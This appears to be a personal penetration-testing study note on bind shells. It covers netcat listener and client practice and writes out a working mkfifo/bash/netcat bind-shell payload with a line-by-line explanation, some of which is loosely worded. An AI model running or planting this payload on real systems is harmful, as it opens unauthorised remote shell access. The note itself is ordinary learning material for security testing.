- Working to establish a shell on a system on a local or remote network. 
- It means the tester has to use the `Terminal emulator` on a local machine to control the remote system through its shell.
- This can be done using a `Bind` &/or `Reverse Shell`.

- ## Bind Shell: 
	- The target system `has a listener started and awaits a connection` from a pentester's system.  
	
		- There can be many challenges associated with getting a shell this way.
		
			-  There would have to be a listener already started on the target.
			- If there is no listener started, we would need to find a way to make this happen.
			- Admins typically configure strict firewall rules and `NAT {Network Address Translation} with (PAT implementation)` on the edge of the network(public-facing) so we would need to be no the internal network already .
			- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
		
		- #### Practicing With Netcat:
		
			- Interacting with the target machine to understand the nature of bind shell.
			
				- ### No. 1: Server - Target starting Netcat listener:
				
					- `nc -lvnp <port>`
						- Here the target is the server and the pentester is the client. 
						- Once the above command is executed the listener is started and awaiting a connection from the client.
				
				- ### No. 2: Client:
				
					- `nc -nv <IP_of_target> <port>`
						- Using `nc` on the client and the server.  

			- On the `Client-side` only the server's IP address is specified and the same port too.
			- If the listener is functioning properly then the connection is working perfectly.
				
				- ### No. 3: Server - Target receiving connection from client
				
					- `nc -lvnp <port>`
					- `Listening on [0.0.0.0] (family 0, port <port>)`
					- `Connection from <attacter_IP> <port> received!` {only if the connection work properly}.
				
				- ### No. 4: Client - Sending message (HI!)
				
					- `nc -nv <IP> <port>`
					- `Connection to <IP> <port> port [tcp/*] succeeded!`
					- `HI!`
				
				- ### No. 5: Server Target receiving (HI!) messages
				
					- `nc -lvnp <port>`
					- `Listening on [0.0.0.0] (family -,  port <port>)`
					- `Connection from <target> <port> received!`
					- `HI!`
					
	- ## Establishing a Basic Bind Shell with Netcat:
	
		- ###  No. 1: Server - Binding a Bash shell to the TCP session
		
			-  `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> > /tmp/f`
			
				- The command above are considered as a payload.
				- Explanation of the payload:
					- `rm -f /tmp/f`: force remove the `/tmp/f` from the target system.
					- `mkfifo /tmp/f`: makes a new `/tmp/f` acts like a `communication channel between processess` 
					- `cat /tmp/f`: reads the new `FIFO`.
					- `/bin/bash -i 2>&1`: sends everything from new `cat /tmp/f`.
						- `2>&1`: if any error then it sends to error handler.
					- `nc -l <IP> <port> > /tmp/f` : creates a remote bind shell.
						- `> /tmp/f`: push all the data or info to newly created `/tmp/f`
				
			- ==/tmp/f== is used as a bridge between `bash` and `nc`  
		
		- ### No. 2: Client - Connecting to bind shell on target:
			
			- `nc -nv <IP> <port>`
			- `Target@server:~` {a remote bind shell as a result}

[[Shells]]